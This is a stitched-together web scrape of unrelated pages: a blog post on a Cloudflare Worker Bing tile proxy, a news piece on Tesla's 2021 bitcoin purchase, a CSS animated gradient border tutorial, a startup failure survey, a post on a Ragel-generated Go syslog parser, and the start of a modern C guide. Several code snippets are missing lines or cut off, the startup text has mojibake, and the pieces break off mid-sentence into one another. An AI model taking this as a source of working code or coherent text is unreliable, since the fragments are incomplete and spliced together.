<span>}</span></code></pre> <p>The catch is that this function must run for every slippy tile request so it can be converted on the fly to a quadtree key. Additionally, zooming or panning around a map can fire off a ton of requests simultaneously. Enter: <a href="https://workers.cloudflare.com/" rel="nofollow">Cloudflare Workers</a>. </p> <p>For the uninitiated, Cloudflare Workers were basically designed for this type of workload. A worker is simply a JavaScript function that handles an HTTP request. In this case, the worker takes the incoming HTTP tile request, transforms it to a request that Bing understands, and sends the response back to the user.</p> <p>Unforunately, Bing doesn’t make it quite that easy. Before any Bing layers can be loaded, the layer endpoint must be requested from the Bing Maps <a href="https://docs.microsoft.com/en-us/bingmaps/rest-services/imagery/get-imagery-metadata" rel="nofollow">Metadata API</a>. </p> <pre><code><span>&gt;</span> <span>fetch</span><span>(</span><span>'https://dev.virtualearth.net/REST/v1/Imagery/Metadata/{imagerySet}?key={key}&amp;uriScheme=https'</span><span>)</span>
<span>{</span>
  <span>"resourceSets"</span><span>:</span> <span>[</span>  
    <span>{</span>

        <span>}</span>
      <span>]</span>  
    <span>}</span>  
  <span>]</span><span>,</span>  
  <span>...</span>
<span>}</span></code></pre> <p>The metadata API has a lower rate limit than normal tile requests and loading it for every tile is not be feasible. Cloudflare Workers are idempotent and share no state from one request to the next. Enter: <a href="https://developers.cloudflare.com/workers/learning/how-kv-works" rel="nofollow">Cloudflare KV</a>.</p> <h2>Caching Imagery Metadata</h2> <p>Using Cloudflare KV, the latest tile endpoint can be cached so it’s reused for every subsequent tile request. The cache is keyed by imagery layer and a hash of the user’s API key. By including the API key hash, the cache is bucketed by Bing Maps user. In this snippet, the Cloudflare KV store is injected into the runtime as a global <code>ENDPOINTS</code> variable.</p> <pre><code><span>async</span> <span>function</span> <span>getCacheKey</span><span>(</span><span>imagerySet<span>,</span> key</span><span>)</span> <span>{</span>
    <span>const</span> buffer <span>=</span> <span>new</span> <span>TextEncoder</span><span>(</span><span>"utf-8"</span><span>)</span><span>.</span><span>encode</span><span>(</span>key<span>)</span><span>;</span>

    <span>return</span> <span>ENDPOINTS</span><span>.</span><span>get</span><span>(</span>cacheKey<span>)</span><span>;</span>
<span>}</span></code></pre> <p>All that’s left is to connect the pieces together. When a request hits the worker, the query string and URL path parameters are parsed:</p> <pre><code><span>const</span> url <span>=</span> <span>new</span> <span>URL</span><span>(</span>request<span>.</span>url<span>)</span><span>;</span>
<span>const</span> query <span>=</span> <span>[</span>

<span>const</span> m <span>=</span> url<span>.</span>pathname<span>.</span><span>match</span><span>(</span><span><span>/</span><span>^/(w+)/(d+)/(d+)/(d+).jpg$</span><span>/</span><span>m</span></span><span>)</span><span>;</span>
<span>const</span> <span>[</span>path<span>,</span> imagerySet<span>,</span> z<span>,</span> x<span>,</span> y<span>]</span> <span>=</span> m<span>;</span>
</code></pre> <p>Then the tile URL template is retrieved from the cache, the <code>x</code>, <code>y</code> and <code>z</code> parameters are converted to a quadkey, and the actual tile is fetched from Bing:</p> <pre><code><span>const</span> template <span>=</span> <span>await</span> <span>getTemplate</span><span>(</span>imagerySet<span>,</span> query<span>.</span>key<span>)</span><span>;</span>
<span>const</span> quadkey <span>=</span> <span>toQuadKey</span><span>(</span>x<span>,</span> y<span>,</span> z<span>)</span><span>;</span>

    status<span>:</span> tile<span>.</span>status<span>,</span>

    headers<span>:</span> tile<span>.</span>headers<span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre> <p>The whole process is blazing fast since the worker and data store are deployed to Cloudflare endpoints around the globe. The tile proxy is basically transparent to the end user. No user data is stored, and it runs at no cost. </p> <p>After writing this service almost a year ago, it’s now handling around 50k requests per week with zero errors and no maintenance.</p> <h3>Get started with the tile proxy</h3>   <hr> <h2>Stay in touch</h2> <p>The next post will be about mapping Bosnia &amp; Herzegovina's minefields and minimizing risk while hiking and mountaineering.

<p>Tesla bought $1.5 billion worth of bitcoin, the company said in a <a rel="noreferrer noopener" href="https://secfilings.nasdaq.com/filingFrameset.asp?FilingID=14678414&amp;RcvdDate=2/8/2021&amp;CoName=TESLA,%20INC.&amp;FormType=10-K&amp;View=html" target="_blank">regulatory filing</a> on Monday, effectively putting nearly all of the money it earned on clean car credits towards the world’s filthiest asset. </p>



<p>Where to begin? Let’s start with the firm’s SEC filing. As of January 2021, the Silicon Valley-based company updated its investment policy to allow it more flexibility in diversifying its returns on cash. Those changes allow Tesla to buy bitcoin and other cryptocurrencies, which it immediately did.</p>



<p>“Thereafter, we invested an aggregate $1.50 billion in bitcoin under this policy and may acquire and hold digital assets from time to time or long-term. Moreover, we expect to begin accepting bitcoin as a form of payment for our products in the near future, subject to applicable laws and initially on a limited basis, which we may or may not liquidate upon receipt.”</p>



<p>The filing does not say how Tesla bought the bitcoin or how they are custodying it. It also does not tell us how many bitcoin it purchased or for what average price. We only know Tesla bought bitcoin sometime between Jan. 1 and early February, when the price was between $30,000 to $41,000.&nbsp;</p>



<p>Tesla says its customers will be able to buy its vehicles with bitcoin. However, “liquidate upon receipt” means that if you purchase a Tesla with bitcoins, the company is likely to sell those bitcoins for cash immediately, something that is usually done by sending the funds through a payment processor first. </p>



<p>This is what most large merchants do when they say they are accepting bitcoin. They convert it to cash, so they don’t have to deal with bitcoin’s wild volatility. So if you buy a Tesla with bitcoin in the future, it will likely be the same as selling your bitcoin for fiat and then handing the cash over to Tesla. </p>



<h2>Clean car credits for bitcoin</h2>



<p>Tesla earns tradable credits under various regulations related to zero-emission vehicles, greenhouse gas, fuel economy, renewable energy, and clean fuel. It then turns around and sells those credits to other automakers when they can’t comply with auto emissions and fuel economy standards.</p>



<p>In 2020, Tesla reported making $1.58 billion in selling these tradable credits it received. And here is the important bit: without those tradeable credits, the company would not have been profitable. <a href="https://apnews.com/article/coronavirus-pandemic-67705113fb4f895bd051a1bee1d23518" target="_blank" rel="noreferrer noopener">Tesla would have lost money.</a> So what does it do with that money? It turns around and buys bitcoin. </p>



<p>Bitcoin is an environmental disaster. The bitcoin network currently burns around 116.87 terawatt-hours per year, according to the <a href="https://cbeci.org/">University of Cambridge’s Centre for Alternative Finance.</a> To give you an idea of how devastating that is to our climate, that is as much energy as a small country or <a href="https://news.bitcoin.com/the-bitcoin-network-now-consumes-7-nuclear-plants-worth-of-power/#:~:text=The%20Cambridge%20Bitcoin%20Electricity%20Consumption%20Index%20(CBECI)%20shows%20the%20estimated,is%207.46%20gigawatts%20(GW).&amp;text=The%20amount%20of%20power%20consumed,photovoltaic%20(PV)%20solar%20panels." target="_blank" rel="noreferrer noopener">seven nuclear power plants. </a></p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Bitcoin is such an environmental disaster it really is a crime against humanity.  So what does Tesla do with their $1.5B in revenue last year from clean car credits sold to other automakers?  Put it into “Destroy the Planet Inc”</p>— Nicholas Weaver (@ncweaver) <a href="https://twitter.com/ncweaver/status/1358780808144723968?ref_src=twsrc%5Etfw">February 8, 2021</a></blockquote></div>
</div></figure>



<p>Keep in mind, bitcoin’s energy consumption increases right alongside the price of bitcoin. As bitcoin goes up in price, more people want to mine the virtual currency for profit, leading to greater energy consumption as they pile more money into power-hungry ASIC rigs.</p>



<p>Bitcoin is not only filthy for its energy waste but also because it is the currency of choice in underground economies. <a href="https://www.forbes.com/sites/andreatinianow/2020/07/01/bitcoin-demand-drives-14-billion-ransomware-industry-in-the-us/?sh=40346fca32d8" target="_blank" rel="noreferrer noopener">Ransomware</a> would probably not exist if it were not for bitcoin. </p>



<p>And bitcoin fits the very definition of <a rel="noreferrer noopener" href="https://www.ic.unicamp.br/~stolfi/bitcoin/2020-12-31-bitcoin-ponzi.html" target="_blank">a Ponzi scheme.</a> It has no intrinsic value—any money new investors put into the system immediately goes out via bitcoin miners selling their 900 newly minted bitcoin per day. Tesla’s massive influx of cash will fund the bitcoin miners for about a month and a half, at most. </p>



<h2>Elon Musk shilling crypto</h2>



<p>Two years ago, Musk and Tesla paid a combined <a rel="noreferrer noopener" href="https://www.sec.gov/news/press-release/2018-226" target="_blank">$40 million penalty</a> to the SEC after Musk’s cryptic tweets about taking Tesla private led to stock fluctuations. The regulator <a href="https://www.sec.gov/litigation/complaints/2018/comp-pr2018-219.pdf">charged him</a> with securities fraud. As part of the settlement, Musk agreed to step down as chairman of the company, although he continued to hold the title of CEO. </p>



<p>Apparently, Musk has learned nothing from that experience. Last month, presumably around the time Tesla was buying up hoards of bitcoin unbeknownst to the general public, Musk caused the price of bitcoin to go up 20% when he <a rel="noreferrer noopener" href="https://www.cnbc.com/2021/01/29/bitcoin-spikes-20percent-after-elon-musk-adds-bitcoin-to-his-twitter-bio.html" target="_blank">changed his&nbsp;Twitter bio</a>&nbsp;to include the word “bitcoin.”</p>



<p>Soon after changing the bio, Musk said in a&nbsp;<a rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1355068728128516101" target="_blank">tweet:</a> “In retrospect, it was inevitable.” In retrospect, that tweet looks like an early hint that Tesla was funneling money into the digital asset.  </p>



<figure><div>

</div></figure>



<p>Will Musk get into trouble for his bitcoin tweets? </p>



<p>It is unlikely, Columbia University Law Professor John Coffee, Jr., told the <a href="https://www.wsj.com/articles/tesla-buys-1-5-billion-in-bitcoin-11612791688">Wall Street Journal</a>, especially given that a federal judge rebuked the SEC when it sought to hold Musk in contempt in 2019. “I don’t think the commission would dare push it that far,” he said. </p>



<p>The latest Tesla news caused bitcoin to spike 18% this morning, <a rel="noreferrer noopener" href="https://www.cnbc.com/2021/02/08/bitcoin-surges-above-43000-to-a-record-after-elon-musks-tesla-buys-1point5-billion.html" target="_blank">sending the price to over $44,000,</a> and setting a new all-time high. </p>



<p><em>Updates Feb. 8: Bitcoin topped $44,000 on Monday, even higher than the $43,000 I mentioned earlier. I added that in the SEC settlement Musk agreed to step down as chairman of Tesla. And I added the Coffee quote from WSJ.</em></p>

        Note that the resulting booklet always has a multiple of 4 pages.
        If the pdf does not have a multiple of 4 pages the resulting booklet will have empty pages.
        These empty pages will be inserted at the end of the pdf.
        Should the last page be a cover you can set the above checkmark to ensure these empty pages will be inserted

February 8, 2021 | https://www.bram.us/2021/01/29/animating-a-css-gradient-border/ | <a href="https://web.archive.org/web/*/https://www.bram.us/2021/01/29/animating-a-css-gradient-border/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Recently, <a href="https://twitter.com/5t3ph">Stephanie Eckles</a> sent out a call to revive the use of CSS <code>border-image</code>. Not to use it with images — which requires a pretty nasty syntax — but to create Gradient Borders in CSS.</p>
<blockquote>
<p lang="en" dir="ltr">🎉 Time to revive an old CSS property!</p>
<p>When `border-image` was announced, I was off-put b/c the syntax was so wild.</p>
<p>But with modern browsers, it's the *easiest* way to create gradient borders.</p>
<p>Learn more about CSS borders in the new ModernCSS tutorial:<a href="https://t.co/W7YVS7f0Jp">https://t.co/W7YVS7f0Jp</a> <a href="https://t.co/nj6WSmBplC">pic.twitter.com/nj6WSmBplC</a></p>
<p>— Stephanie Eckles (@5t3ph) <a href="https://twitter.com/5t3ph/status/1337376983269974026?ref_src=twsrc%5Etfw">December 11, 2020</a></p></blockquote>

<p>Curious to see what we can do with them, I whipped up a few demos using CodePen.</p>
<p>~</p>
<p>The most simple usage is to set some type of <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Images/Using_CSS_gradients">CSS gradient</a> as the <code>border-image</code>:</p>
<pre><code>div {
    border: 3em solid;
    border-image: linear-gradient(to right, green, yellow) 1;
}</code></pre>
<p data-height="443" data-theme-id="dark" data-default-tab="css,result" data-user="bramus" data-slug-hash="NWbKXYG" data-pen-title="CSS Gradient Border"><span>See the Pen <a href="https://codepen.io/bramus/pen/NWbKXYG">CSS Gradient Border</a> by Bramus (<a href="https://codepen.io/bramus">@bramus</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p>

<p>Then I wondered if I could animate the border, so that it would rotate along the edge.</p>
<p>~</p>
<p>To animate the border gradient you’ll need to add an angle in there — using a Custom Property — which you animate using some <code>@keyframes</code>.</p>
<pre><code>div {
  --angle: 0deg;
  /* … */
  border-image: linear-gradient(var(--angle), green, yellow) 1;
  animation: 10s rotate linear infinite;
}

@keyframes rotate {
  to {
    --angle: 360deg;
  }
}</code></pre>
<p>By using a Custom Property we can have the browser properly automatically interpolate this value from <code>0deg</code> to <code>360deg</code> instead of needing to add individual keyframes for every 1 degree increase. For this to work we have to register the Custom Property using <a href="https://web.dev/at-property/">the amazing <code>@property</code> at-rule</a></p>
<pre><code>@property --angle {
  syntax: '&lt;angle&gt;';
  initial-value: 0deg;
  inherits: false;
}</code></pre>
<p>⚠️ As <code>@property</code> is only supported in Chromium, the demos from here on down will only work in browsers based upon it. For browsers that don’t support it we could add individual keyframes for each step, but for demonstration purposes I’m skipping out on that here.</p>
<p data-height="443" data-theme-id="dark" data-default-tab="css,result" data-user="bramus" data-slug-hash="eYBOvGW" data-pen-title="CSS Gradient Border"><span>See the Pen <a href="https://codepen.io/bramus/pen/eYBOvGW">CSS Gradient Border (Animated)</a> by Bramus (<a href="https://codepen.io/bramus">@bramus</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p>
<p>~</p>
<p>While the effect here looks quite nice it won’t play nice with more than two colors. Take this rainbow animated gradient border for example:</p>
<p data-height="443" data-theme-id="dark" data-default-tab="css,result" data-user="bramus" data-slug-hash="vYyBbBq" data-pen-title="CSS Rainbow Gradient Border (Animated, Attempt 1)"><span>See the Pen <a href="https://codepen.io/bramus/pen/vYyBbBq">CSS Rainbow Gradient Border (Animated, Attempt 1)</a> by Bramus (<a href="https://codepen.io/bramus">@bramus</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p>

<p>🕵️‍♂️ You can see best what’s going on by toggling the fill option there … ugh, that’s not what we want!</p>
<p>To fix that I first thought of using a radial gradient but what I need is <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/conic-gradient()#composition_of_a_conic_gradient">a conic gradient</a>:</p>
<p><img loading="lazy" src="https://www.bram.us/wordpress/wp-content/uploads/2021/01/conic-vs-radial-gradient.png" alt="" width="560" height="280" data-old-src="https://www.bram.us/wordpress/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://www.bram.us/wordpress/wp-content/uploads/2021/01/conic-vs-radial-gradient.png"></p>
<p>This way each color of the gradient will extend nicely into the border, resulting in a correct animation.</p>
<pre><code>div {
    /* … */
    border-image: conic-gradient(from var(--angle), red, yellow, lime, aqua, blue, magenta, red) 1;
}</code></pre>
<p>💁‍♂️ To make the end of the gradient blend nicely into its begin color, we have to repeat the said color — e.g. <code>red</code> — as the last entry.</p>
<p data-height="443" data-theme-id="dark" data-default-tab="css,result" data-user="bramus" data-slug-hash="rNWByYz" data-pen-title="CSS Rainbow Gradient Border (Animated)"><span>See the Pen <a href="https://codepen.io/bramus/pen/rNWByYz">CSS Rainbow Gradient Border (Animated)</a> by Bramus (<a href="https://codepen.io/bramus">@bramus</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p>

<p>When toggling the fill you can see that <code>border-image</code> here stretches out the color perpendicular to its edge, instead of letting the gradient “pass”. This might not be 100% what you want, but for me it was exactly what I aimed for 🙂</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img alt="visualizing startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-01.png"></figure><div><p dir="ltr">Why do startups fail, and what can founders do to prevent it?</p>
<p dir="ltr">Many entrepreneurs and investors opine on this question, but few offer data-driven answers. Our goal is to identify and share clear learnings on this, and the timing could not be more critical.</p>
<p dir="ltr">In 2020, the U.S. Internal Revenue Service received more than 4.4 million applications for new businesses according to the Bureau of Labor Statistics (BLS).<sup>1</sup> In the second, third, and fourth quarters, business formation topped <em>every quarter since 2005</em>. Although COVID-19 has shuttered almost 30% of small businesses, it is simultaneously responsible for the 21st centuryâ€™s greatest surge in entrepreneurship.<sup>2</sup></p>
<p>For would-be founders, thereâ€™s no avoiding the undeniable: sustained success is statistically unlikely. Nearly a fifth of new businesses shut down in their first year according to BLS data.<sup>3</sup> Even with venture backing, a staggering three-quarters of startups fail according to research by Shikhar Ghosh of Harvard Business School.<sup>4 </sup>However, fear of failure shouldnâ€™t prevent anyone from starting a business.</p>
<p dir="ltr">One great way to raise the odds of startup success is to learn from current and past entrepreneurs. Towards that end, Wilbur Labs surveyed more than 150 startup founders about the pressures that threatened their businesses. We also pulled records of 350 startup failures from CB Insights and Autopsy then analyzed them for patterns. The resulting insights can help founders improve their odds of success this year and beyond.</p>
<p dir="ltr">When founders solve significant problems and avoid preventable failures, everyone stands to benefit. In that spirit, weâ€™ll examine why startups fail (i.e., shutdown permanently) and how they overcome potential failures.</p></div><h2>Why Startups Fail</h2><p>About 70% of entrepreneurs will face potential business failure based on our survey of more than 150 founders. Nearly 66% will face this potential failure within 25 months of launching their company. Almost 77% of respondents who faced potential failure said it was due â€” at least in part â€” to COVID-19.</p><figure><img alt="statistic of founders facing business failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-02.png"></figure><p>Based on a novel analysis of data from CB Insights and Autopsy, we identified the reasons that founders cite for failure.<sup>5,6</sup> Keep in mind: this is self-reported data.</p><figure><img alt="most common reasons for startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-03.png"></figure><div><p dir="ltr">More than one-third of founders believe that running out of money led to failure. Second to that, founders attribute their failure to a lack of financing or investor interest. In other words, if they managed to generate more revenue, spend less money, and/or raise capital through alternative channels, their startups might have survived.</p>
<p dir="ltr">Running out of money seems related to the third most common reason for failure: no business plan or model. Perhaps founders mistakenly believe that a business plan will slow them down or limit their agility. Or, maybe they expect to exit before thereâ€™s pressure to be profitable. Such founders are likely to bank on their next funding round, an acquisition, or a major enterprise deal for survival. If those donâ€™t materialize, thereâ€™s no plan B.</p>
<p dir="ltr">Although most startups cannot expect to generate profits immediately, they should have a break-even point and a plan to reach it. As former Google CEO Eric Schmidt often says, â€œRevenue solves all known problems.â€� Revenue can also solve <em>unknown</em> problems, as the COVID-19 pandemic has illustrated.</p>
<p dir="ltr">Revenue generation also proves that a startup is solving a significant problem in a sustainable way. If no one will pay for the solution, more financing wonâ€™t necessarily change that. There is simply no better measure of product-market fit and competitiveness than revenue.</p>
<p dir="ltr">Based on the data, strong business planning with an eye towards profitability is the surest way to avoid failure. When Wilbur Labs surveyed 150+ founders about their recommendations for preventing failure, they tended to agree:</p></div><figure><img alt="founder recommendations for preventing startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-04.png"></figure><div><p dir="ltr">Nearly 30% of respondents urged founders to do more research prior to launch, while roughly 22% recommended building a stronger business plan. Even though running out of money is the leading cause of failure, relatively few (13.5%) founders recommend financing as a way to prevent that.</p>
<p dir="ltr">In a free-response section where respondents could enter any advice for founders, this theme persisted. A quarter of responses emphasized research, planning, and/or preparation. Only 6% said â€œjust do itâ€� or â€œgo for it.â€�</p>
<p dir="ltr">We encourage founders to look at Wilbur Labsâ€™ Concept Evaluation â€” our version of a business plan â€” which you can view in our post, <a href="https://www.wilburlabs.com/blueprints/how-to-turn-an-idea-into-a-business">How to Turn an Idea Into a Business</a>.</p></div><h2>Reasons for Startup Failure Over Time</h2><p>Launching a business is never easy. But do the dominant causes of failure change over time? To find out, we plotted the prevalence of each reason for failure across the last six years.</p><figure><img alt="reasons for startup failure" src="https://storage.googleapis.com/wl-blog/images/startup-fail-05.png"></figure><div><p dir="ltr">Although the causes of startup failure changed significantly in a mere six years, challenges with money and financing remained the top reasons for failure. In fact, they have grown more troublesome since 2014, even as venture investment totals break new records annually.</p>
<p dir="ltr">Venture money is not distributed evenly, however. The National Venture Capital Association (NVCA) and PitchBook note that â€œmega dealsâ€� (venture investments of $100M or more) account for a growing proportion of the total â€” about 45% in 2020, up from 40% in 2019.<sup>7,8 </sup>Unless VCs are lined up to invest, depending on the next venture round is an ever-riskier survival strategy for startups.</p>
<p dir="ltr">Some causes of failure have grown more prevalent since 2014, including a lack of market need. That doesnâ€™t mean the world is running out of startup ideas (see <a href="https://www.wilburlabs.com/blueprints/how-to-get-startup-ideas">How to Get Startup Ideas</a>, a Wilbur Labs post addressing this topic in detail). Rather, that may reflect a lack of cultural, geographic, and socioeconomic diversity among founders and investors. The sense of increasing competition may suggest that too many founders have piled into red oceans without enough differentiation. Notice that a lack of market need and mistimed products spiked <em>only</em> in 2020. COVID-19 throttled startups that could not adapt to socially distanced living.</p>
<p dir="ltr">Either way, long gone are the days when founders could launch an app or product and users would swarm to try it. Thereâ€™s too much noise out there. Solving real problems that serve people better is even more critical now, given the sheer number of products competing daily for attention.</p>
<p dir="ltr">Legal challenges have also been on the rise, perhaps due to increasing regulation of digital companies. Before Europeâ€™s General Data Protection Regulation (GDPR) went into effect in 2018, UK small businesses each spent an average of 600 hours to prepare.<sup>9</sup> Early on in a venture, any distraction from building a product and serving customers can be deadly. Encouragingly, fewer founders say their network, scale, team, UX, marketing, or lack of focus are barriers to success compared to six years ago. Maybe startup development is becoming more professional and systematic. Failure to pivot is another barrier in decline. Nearly 30% of startups reported this being a cause for their failure in 2014, but six years later, just under 15% reported the same. Founders willing to pivot tend to raise their odds of success, as the next set of data demonstrates.</p></div><h2>Startup Founders and Pivot Strategies</h2><p>In our survey of 150 founders, 55% reported pivoting to avoid failure. Less than half felt confident in their likelihood of success when the pivot took place. Even so, nearly 75% of the founders who pivoted said it was successful.</p><figure><img alt="percentage of founders who pivoted" src="https://storage.googleapis.com/wl-blog/images/startup-fail-06.png"></figure><figure><img alt="founders who pivoted and succeeded percentage" src="https://storage.googleapis.com/wl-blog/images/startup-fail-07.png"></figure><div><p dir="ltr">During a pivot, founders should build the plane as they fly it. The team must learn from mistakes, iterate, and adapt quickly â€” before the money runs out. Presumably, founders who invest in identifying and mitigating future risks have better odds of not only pivoting but surviving the process.</p>
<p dir="ltr">But which pivots work and why? Which strategies save companies?</p></div><figure><img alt="most common pivot strategies" src="https://storage.googleapis.com/wl-blog/images/startup-fail-08.png"></figure><div><p dir="ltr">A majority of founders pivoted by updating or improving their business plan. As noted earlier, a bad business plan is the third most common cause of failure and is linked to running out of money, the most frequently reported reason for failure.</p>
<p dir="ltr">Few startups launch with a bulletproof, immutable plan. Rather, successful founders create a plan and improve it continuously as market conditions and customer feedback demand. Changing the business plan can lead to the second and third most popular strategies: improving the existing product or launching a new one.</p>
<p dir="ltr">Almost 13% of founders said they attempted to pivot by securing additional funding or investors. This is a rarer pivot but an important one given how commonly startups fail by running out of money or by failing to secure more funding. While capital-intensive businesses (e.g., clean industrial technologies) may depend on external financing for longer than average, most startups can avoid this dicey pivot by focusing on their business model and revenue. </p></div><h2>Advice From Other Founders</h2><p>The odds are stacked against startups. But by studying other foundersâ€™ mistakes, aspiring entrepreneurs can anticipate and manage preventable failures. With this in mind, Wilbur Labs asked startup founders to indicate the advice they would give to other entrepreneurs.</p><figure><img alt="advice for aspiring startup founders" src="https://storage.googleapis.com/wl-blog/images/startup-fail-09.png"></figure><div><p dir="ltr">The leading suggestions are fundamental rules of startup survival: learn from mistakes, listen to customers, and ensure that there is a market for your product.</p>
<div dir="ltr"><p>Less common but noteworthy is how many founders recommend looking for outside help in the form of legal advice (29%), networking (28%), consultants (28%), and a team with diversified skills (22%). </p><p>Despite the stereotype, successful founders are <em>not</em> rugged individualists living off Walden Pond.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><time datetime="2021-01-25T09:57:37-0500">Mon, Jan 25, 2021</time></p><p>Recently I was working on <code>go-syslog</code><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> package making some changes for a
private project. This package parses incoming Syslog<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> records and returns
structured data.</p><p>My first questions, when I opened a file
<a href="https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go">https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go</a> were:
“What a heck is that?”, “Who is writing in Golang but in C-like style?” and
“How can I read it and make any modifications here?”</p><p>Before making any modifications I have to get a bit understanding how it works.
Everything is completely clear until
<a href="https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go#L97">line:97</a>
where two things start: function <code>machine.Parse</code> and “goto hell”. The function
is <em>8500</em> lines long and mostly consists of labels, <code>goto</code> statements and “magic
numbers”. At that point I had no idea how to deal with it.</p><p>That is how it looks like</p><div><pre><code data-lang="go">	{
		<span>var</span> _widec <span>int16</span>
		<span>if</span> (m.p) <span>==</span> (m.pe) {

		}
		<span>switch</span> m.cs {
		<span>case</span> <span>1</span>:

	stCase104:
		<span>if</span> (m.data)[(m.p)] <span>==</span> <span>32</span> {

</span></code></pre></div><p>Well, someone wrote it, right? That means I can modify it I thought and I’ve
started project exploring. I quickly found another file
<a href="https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go.rl">machine.go.rl</a>
which also started as a Golang file but soon on <a href="https://github.com/influxdata/go-syslog/blob/develop/rfc3164/machine.go.rl#L23">line

quickly define a state machine which converts incoming data into a well-defined
structure.

be filled during the parse process.</p><div><pre><code data-lang="go"><span>type</span> Phone <span>struct</span>{

<code>string</code>, it’s no matter in our case.</p><h2 id="unit-tests">Unit tests</h2><p>Working with code generators more and more I can say that unit-tests are a
significant part of the development. They validate generated code and produce
the result we expect. In most of my cases it is faster to write such tests
rather than trying to debug generated code manually. Also, small changes in the
generator input can drastically change and output.</p><p>We have an input, we know what we want to get as an output, we are good to
write tests. Due to our parser does two things, parses the phone itself,
validates phone format and returns an error if format is incorrect. We need
three groups of tests:</p><ul><li><strong>positive tests</strong>, i.e. tests which check all <em>correct</em> values parsed properly</li><li>tests which check <strong>correctness of area code</strong> and validates an error, and</li><li>tests which check <strong>correctness of phone number</strong> and validates an error</li></ul><p>For unit tests I use <a href="https://onsi.github.io/ginkgo/">Ginkgo</a> library.

actual value, which inside the function can be retrieved with

positive tests it checks actual values in structure fields. All the inputs have

<p><em>Now on to the article…</em></p>
<p>The first rule of C is don’t write C if you can avoid it.</p>
<p>If you must write in C, you should follow modern rules.</p>
<p>C has been around since the <a href="https://www.bell-labs.com/usr/dmr/www/chist.html">early 1970s</a>. People have “learned C” at various points during its evolution, but knowledge usually get stuck after learning, so everybody has a different set of things they believe about C based on the year(s) they first started learning.</p>
<p>It’s important to not remain stuck in your “things I learned in the 80s/90s” mindset of C development.</p>
<p>This page assumes you are on a modern platform conforming to modern standards and you have no excessive legacy compatibility requirements. We shouldn’t be globally tied to ancient standards just because some companies refuse to upgrade 20 year old systems.</p>
<h2 id="_preflight">Preflight</h2>
<p>Standard c99 (c99 means “C Standard from 1999”; c11 means “C Standard from 2011”, so 11 &gt; 99).</p>
<ul>
<li>clang, default
<ul>
<li>clang uses an extended version of C11 by default (<code>GNU C11 mode</code>), so no extra options are needed for modern features.</li>
<li>If you want standard C11, you need to specify <code>-std=c11</code>; if you want standard C99, use <code>-std=c99</code>.</li>
<li>clang compiles your source files faster than gcc</li>
</ul></li>
<li>gcc requires you specify <code>-std=c99</code> or <code>-std=c11</code>
<ul>
<li>gcc builds source files slower than clang, but <em>sometimes</em> generates faster code. Performance comparisons and regression testings are important.</li>
<li>gcc-5 defaults to <code>GNU C11 mode</code> (same as clang), but if you need exactly c11 or c99, you should still specify <code>-std=c11</code> or <code>-std=c99</code>.</li>
</ul></li>
</ul>
<p>Optimizations</p>
<ul>
<li>-O2, -O3
<ul>
<li>generally you want <code>-O2</code>, but sometimes you want <code>-O3</code>. Test under both levels (and across compilers) then keep the best performing binaries.</li>
</ul></li>
<li>-Os
<ul>
<li><code>-Os</code> helps if your concern is cache efficiency (which it should be)</li>
</ul></li>
</ul>
<p>Warnings</p>
<ul>
<li><code>-Wall -Wextra -pedantic</code>
<ul>
<li><a href="https://twitter.com/oliviergay/status/685389448142565376">newer compiler versions</a> have <code>-Wpedantic</code>, but they still accept the ancient <code>-pedantic</code> as well for wider backwards compatibility.</li>
</ul></li>
<li>during testing you should add <code>-Werror</code> and <code>-Wshadow</code> on all your platforms
<ul>
<li>it can be tricky deploying production source using <code>-Werror</code> because different platforms and compilers and libraries can emit different warnings. You probably don’t want to kill a user’s entire build just because their version of GCC on a platform you’ve never seen complains in new and wonderous ways.</li>
</ul></li>
<li>extra fancy options include <code>-Wstrict-overflow -fno-strict-aliasing</code>
<ul>
<li>Either specify <code>-fno-strict-aliasing</code> or be sure to only access objects as the type they have at creation. Since so much existing C code aliases across types, using <code>-fno-strict-aliasing</code> is a much safer bet if you don’t control the entire underlying source tree.</li>
</ul></li>
<li>as of now, Clang reports some valid syntax as a warning, so you should add <code>-Wno-missing-field-initializers</code>
<ul>
<li>GCC fixed this unnecessary warning after GCC 4.7.0</li>
</ul></li>
</ul>
<p>Building</p>
<ul>
<li>Compilation units
<ul>
<li>The most common way of building C projects is to decompose every source file into an object file then link all the objects together at the end. This procedure works great for incremental development, but it is suboptimal for performance and optimization. Your compiler can’t detect potential optimizations across file boundaries this way.<br>
</li>
</ul></li>
<li>LTO —&nbsp;Link Time Optimization
<ul>
<li>LTO fixes the “source analysis and optimization across compilation units problem” by annotating object files with intermediate representation so source-aware optimizations can be carried out across compilation units at link time.</li>
<li>LTO can slow down the linking process noticeably, but <code>make -j</code> helps if your build includes multiple non-interdependent final targets (.a, .so, .dylib, testing executables, application executables, etc).</li>
<li><a href="http://llvm.org/docs/LinkTimeOptimization.html">clang LTO</a> (<a href="http://llvm.org/docs/GoldPlugin.html">guide</a>)</li>
<li><a href="https://gcc.gnu.org/onlinedocs/gccint/LTO-Overview.html">gcc LTO</a></li>
<li>As of 2016, clang and gcc releases support LTO by just adding <code>-flto</code> to your command line options during object compilation and final library/program linking.</li>
